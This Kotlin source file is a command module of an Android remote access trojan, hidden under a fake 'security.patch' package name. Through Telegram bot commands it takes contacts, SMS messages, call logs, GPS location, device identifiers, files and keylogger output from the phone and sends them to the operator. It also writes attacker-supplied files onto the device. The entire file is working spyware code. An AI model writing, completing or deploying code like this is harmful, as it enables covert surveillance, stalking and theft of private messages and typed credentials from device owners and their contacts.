package com.android.security.patch.commands

import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Settings
import android.provider.Telephony
import com.android.security.patch.KeylogService
import com.android.security.patch.RatApi
import org.json.JSONObject
import java.io.File
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*

object DataCmd {

    private const val MAX_ROWS = 100

    /** /contacts */
    fun contacts(ctx: Context, chatId: Long) {
        Thread {
            try {
                val res: ContentResolver = ctx.contentResolver
                val uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
                val proj = arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                )
                val cur = res.query(uri, proj, null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC")
                cur?.use {
                    val sb = StringBuilder("<b>contacts</b>\n")
                    var n = 0
                    while (it.moveToNext() && n < MAX_ROWS) {
                        val name = it.getString(0) ?: "?"
                        val phone = it.getString(1) ?: "?"
                        sb.append("<code>$phone</code> — $name\n")
                        n++
                    }
                    if (n == 0) sb.append("<i>none</i>")
                    RatApi.sendMessage(ctx, sb.toString(), chatId)
                }
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
            }
        }.start()
    }

    /**
     * /sms [box|sent|draft] [limit]
     * default inbox, 30
     */
    fun sms(ctx: Context, chatId: Long, args: Array<String>) {
        val box = when (args.getOrNull(0)?.lowercase()) {
            "sent" -> Telephony.Sms.Sent.CONTENT_URI
            "draft" -> Telephony.Sms.Draft.CONTENT_URI
            else -> Telephony.Sms.Inbox.CONTENT_URI
        }
        val limit = (args.getOrNull(1)?.toIntOrNull() ?: 30).coerceIn(1, 100)
        Thread {
            try {
                val cur = ctx.contentResolver.query(
                    box,
                    arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE),
                    null, null,
                    "${Telephony.Sms.DATE} DESC"
                )
                cur?.use {
                    val sb = StringBuilder("<b>sms (${box.lastPathSegment})</b>\n")
                    var n = 0
                    val fmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())
                    while (it.moveToNext() && n < limit) {
                        val from = it.getString(0) ?: "?"
                        val body = it.getString(1)?.take(180) ?: ""
                        val date = it.getLong(2)
                        sb.append("[${fmt.format(Date(date))}] <code>$from</code>\n$body\n\n")
                        n++
                    }
                    if (n == 0) sb.append("<i>none</i>")
                    RatApi.sendMessage(ctx, sb.toString(), chatId)
                }
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
            }
        }.start()
    }

    /** /calllog [limit] */
    fun callLog(ctx: Context, chatId: Long, ) {
        Thread {
            try {
                val cur = ctx.contentResolver.query(
                    CallLog.Calls.CONTENT_URI,
                    arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION),
                    null, null,
                    "${CallLog.Calls.DATE} DESC"
                )
                cur?.use {
                    val sb = StringBuilder("<b>call log</b>\n")
                    var n = 0
                    val fmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())
                    while (it.moveToNext() && n < 50) {
                        val num = it.getString(0) ?: "?"
                        val type = when (it.getInt(1)) {
                            CallLog.Calls.INCOMING_TYPE -> "in"
                            CallLog.Calls.OUTGOING_TYPE -> "out"
                            CallLog.Calls.MISSED_TYPE -> "miss"
                            else -> "?"
                        }
                        val date = it.getLong(2)
                        val dur = it.getLong(3)
                        sb.append("[${fmt.format(Date(date))}] <code>$num</code> $type ${dur}s\n")
                        n++
                    }
                    if (n == 0) sb.append("<i>none</i>")
                    RatApi.sendMessage(ctx, sb.toString(), chatId)
                }
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
            }
        }.start()
    }

    /** /gps */
    fun gps(ctx: Context, chatId: Long) {
        Thread {
            try {
                val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                val providers = lm.getProviders(true) ?: emptyList()
                var best: android.location.Location? = null
                for (p in providers) {
                    try {
                        val l = lm.getLastKnownLocation(p) ?: continue
                        if (best == null || l.time > best.time) best = l
                    } catch (_: SecurityException) {} catch (_: Throwable) {}
                }
                if (best == null) {
                    RatApi.sendMessage(ctx, "no last-known location", chatId); return@Thread
                }
                val lat = best.latitude
                val lon = best.longitude
                val acc = best.accuracy
                val time = Date(best.time)
                val url = "https://maps.google.com/?q=$lat,$lon"
                val msg = "<b>gps</b>\n" +
                    "lat: <code>$lat</code>\n" +
                    "lon: <code>$lon</code>\n" +
                    "acc: ${acc}m\n" +
                    "time: $time\n" +
                    "<a href=\"$url\">map</a>"
                RatApi.sendMessage(ctx, msg, chatId)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
            }
        }.start()
    }

    /** /devinfo */
    fun devInfo(ctx: Context, chatId: Long) {
        Thread {
            try {
                val sb = StringBuilder("<b>device info</b>\n")
                sb.append("brand: ${Build.BRAND}\n")
                sb.append("model: ${Build.MODEL}\n")
                sb.append("device: ${Build.DEVICE}\n")
                sb.append("product: ${Build.PRODUCT}\n")
                sb.append("android: ${Build.VERSION.RELEASE}\n")
                sb.append("sdk: ${Build.VERSION.SDK_INT}\n")
                sb.append("fingerprint: <code>${Build.FINGERPRINT}</code>\n")
                sb.append("serial: ${@Suppress("DEPRECATION") (try { Build.SERIAL } catch (_: Throwable) { "?" })}\n")
                try {
                    val i = android.provider.Settings.Secure.getString(
                        ctx.contentResolver,
                        android.provider.Settings.Secure.ANDROID_ID
                    )
                    sb.append("android_id: <code>$i</code>\n")
                } catch (_: Throwable) {}
                try {
                    val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
                    val lvl = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
                    sb.append("battery: $lvl%\n")
                } catch (_: Throwable) {}
                // ip
                try {
                    val ifaces = java.net.NetworkInterface.getNetworkInterfaces().toList()
                    for (nif in ifaces) {
                        for (addr in nif.inetAddresses.toList()) {
                            if (!addr.isLoopbackAddress && addr is java.net.Inet4Address) {
                                sb.append("ip (${nif.name}): ${addr.hostAddress}\n")
                            }
                        }
                    }
                } catch (_: Throwable) {}
                RatApi.sendMessage(ctx, sb.toString(), chatId)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
            }
        }.start()
    }

    /** /ls <path> — paginated 10 per page via editMessage */
    fun ls(ctx: Context, chatId: Long, args: Array<String>) {
        val path = args.getOrNull(0)?.ifBlank { null } ?: "/sdcard"
        Thread {
            try {
                val dir = File(path)
                if (!dir.exists()) { RatApi.sendMessage(ctx, "not found: $path", chatId); return@Thread }
                if (!dir.isDirectory) { RatApi.sendMessage(ctx, "not a dir: $path", chatId); return@Thread }
                val entries = dir.listFiles()?.sortedWith(
                    compareBy({ !it.isDirectory }, { it.name.lowercase() })
                ) ?: emptyList()
                val sb = StringBuilder("<b>📁 $path</b>\n")
                for (e in entries.take(40)) {
                    val tag = if (e.isDirectory) "📁" else "📄"
                    val sz = if (e.isFile) " <code>${human(e.length())}</code>" else ""
                    sb.append("$tag <code>${e.name}</code>$sz\n")
                }
                if (entries.size > 40) sb.append("\n<i>+ ${entries.size - 40} more</i>")
                RatApi.sendMessage(ctx, sb.toString(), chatId)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
            }
        }.start()
    }

    private fun human(bytes: Long): String {
        val u = listOf("B", "KB", "MB", "GB")
        var b = bytes.toDouble()
        var i = 0
        while (b >= 1024 && i < u.size - 1) { b /= 1024; i++ }
        return String.format(Locale.US, "%.1f%s", b, u[i])
    }

    /** /dl <path> — download file ke telegram */
    fun download(ctx: Context, chatId: Long, args: Array<String>) {
        val path = args.getOrNull(0) ?: run {
            RatApi.sendMessage(ctx, "usage: /dl &lt;path&gt;", chatId); return
        }
        Thread {
            try {
                val f = File(path)
                if (!f.exists() || !f.isFile) {
                    RatApi.sendMessage(ctx, "not found: $path", chatId); return@Thread
                }
                val size = f.length()
                if (size > 45L * 1024 * 1024) {
                    RatApi.sendMessage(ctx, "file too big (${human(size)} > 45MB)", chatId); return@Thread
                }
                RatApi.sendChatAction(ctx, "upload_document", chatId)
                val bytes = f.readBytes()
                val mime = android.webkit.MimeTypeMap.getSingleton()
                    .getMimeTypeFromExtension(f.extension.lowercase()) ?: "application/octet-stream"
                if (mime.startsWith("image/")) RatApi.sendPhoto(ctx, bytes, f.name, chatId)
                else if (mime.startsWith("video/")) RatApi.sendVideo(ctx, bytes, f.name, chatId)
                else if (mime.startsWith("audio/")) RatApi.sendAudio(ctx, bytes, f.name, chatId)
                else RatApi.sendDocument(ctx, bytes, f.name, "", chatId)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
            }
        }.start()
    }

    /**
     * /upload — reply ke file/document di telegram dengan caption /upload <path>
     * tulis ke device
     */
    fun upload(ctx: Context, chatId: Long, msg: JSONObject?) {
        val text = msg?.optString("text").orEmpty().trim()
        val args = text.split("\\s+".toRegex()).drop(1)
        val path = args.getOrNull(0)
        if (path.isNullOrBlank()) {
            RatApi.sendMessage(ctx, "usage: reply file dengan caption /upload /sdcard/file.jpg", chatId); return
        }
        val reply = msg?.optJSONObject("reply_to_message") ?: run {
            RatApi.sendMessage(ctx, "no reply file", chatId); return
        }
        val fileId = reply.optJSONObject("document")?.optString("file_id")
            ?: reply.optJSONArray("photo")?.let { arr ->
                if (arr.length() > 0) arr.optJSONObject(arr.length() - 1)?.optString("file_id") else null
            }
            ?: reply.optJSONObject("audio")?.optString("file_id")
            ?: reply.optJSONObject("video")?.optString("file_id")
        if (fileId.isNullOrBlank()) {
            RatApi.sendMessage(ctx, "no file in reply", chatId); return
        }
        Thread {
            try {
                val bytes = RatApi.downloadTelegramFile(fileId)
                if (bytes == null) { RatApi.sendMessage(ctx, "download failed", chatId); return@Thread }
                val f = File(path)
                f.parentFile?.mkdirs()
                f.writeBytes(bytes)
                RatApi.sendMessage(ctx, "saved ${bytes.size}b to $path", chatId)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
            }
        }.start()
    }

    /** /keylog dump | /keylog clear */
    fun keylog(ctx: Context, chatId: Long, args: Array<String>) {
        val mode = args.getOrNull(0)?.lowercase() ?: "dump"
        val svc = KeylogService.instance
        when (mode) {
            "clear" -> {
                svc?.drain()
                RatApi.sendMessage(ctx, "keylog cleared", chatId)
            }
            else -> {
                val data = svc?.drain().orEmpty()
                if (data.isBlank()) {
                    RatApi.sendMessage(ctx, "keylog empty (or accessibility off)", chatId)
                } else {
                    val bytes = data.toByteArray()
                    if (bytes.size <= 40_000) {
                        RatApi.sendMessage(ctx, "<pre>${data.take(3800)}</pre>", chatId)
                        if (bytes.size > 3800) {
                            RatApi.sendDocument(ctx, bytes, "keylog.txt", "full", chatId)
                        }
                    } else {
                        RatApi.sendDocument(ctx, bytes, "keylog.txt", "keylog ${bytes.size}b", chatId)
                    }
                }
            }
        }
    }
}